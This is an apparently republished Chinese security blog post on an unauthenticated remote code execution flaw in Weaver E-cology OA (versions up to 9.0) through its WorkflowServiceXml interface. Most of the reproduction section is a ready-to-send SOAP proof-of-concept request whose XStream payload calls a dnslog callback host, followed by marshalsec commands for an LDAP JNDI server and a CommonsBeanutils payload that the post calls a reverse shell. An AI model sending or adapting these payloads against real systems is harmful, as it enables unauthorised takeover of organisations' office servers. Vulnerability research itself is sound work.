> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DVlZC5jU6MQQqUoM2gKTBg)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BzicGQFYzMEibR2wpz4EfQbjsjOFk7gpPeOV1CGsspeUDDwcMN2roNeLQ/640?wx_fmt=png)

x 微 E-Cology WorkflowServiceXml RCE

‍‍

一、漏洞描述

泛微 E-cology OA 系统的 WorkflowServiceXml 接口可被未授权访问，攻击者调用该接口，可构造特定的 HTTP 请求绕过泛微本身一些安全限制从而达成远程代码执行。

‍二、漏洞影响

E-cology <= 9.0

‍三、漏洞复现‍‍

访问主页：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BAejEF6TxrdL0WicqOu1knurrlqySJz23rTGnrOiaLMBtwfsuCCvcANDA/640?wx_fmt=png)

POC：

```
POST /services%20/WorkflowServiceXml HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Content-Length: 10994
Host: xxx
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
.      <web:string>
        <map>
          <entry>
            <url>http://thelostworld.dnslog.cn</url>
            <string>http://thelostworld.dnslog.cn</string>
          </entry>
        </map>
        </web:string>
        <web:string>2</web:string>
.      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

编码：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BhFTExcW4CWW6p5OFp5vKFAMPUMfqXdqOlayXjZV39qt9uvp4ib6nqSw/640?wx_fmt=png)

```
POST /services%20/WorkflowServiceXml HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Content-Length: 10994
Host: xxx
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
.      <web:doCreateWorkflowRequest>
      <web:string>
        <map>
          <entry>
            <url>http://thelostworld.dnslog.cn</url>
            <string>http://thelostworld.dnslog.cn</string>
          </entry>
        </map>
        </web:string>
.        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

或者直接：  

利用 marshalsec 生成反弹 shell  payload

启动 jndi ：ldap 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#Exploit
```

生存 poc：  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils ldap://127.0.0.1:1389/Exploit > payload.xml
```

DNSlog：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdDuQj65VIerUhLtlUNicJTRAAOqj8Yvj1NshPmzCt2OSRLt5EQI1MGibpwqCITDFjbNCUcaIIQicAiag/640?wx_fmt=png)

执行命令  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdDuQj65VIerUhLtlUNicJTRljRx37B1eicElm5xSr2r1mTRV7A2f6IarwYT5yZs9C0wZbfPVu9KKGg/640?wx_fmt=png)

参考：  

https://mp.weixin.qq.com/s/-eTSGvjuygGxULHcw6lOMg

http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE.html?h=%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)

‍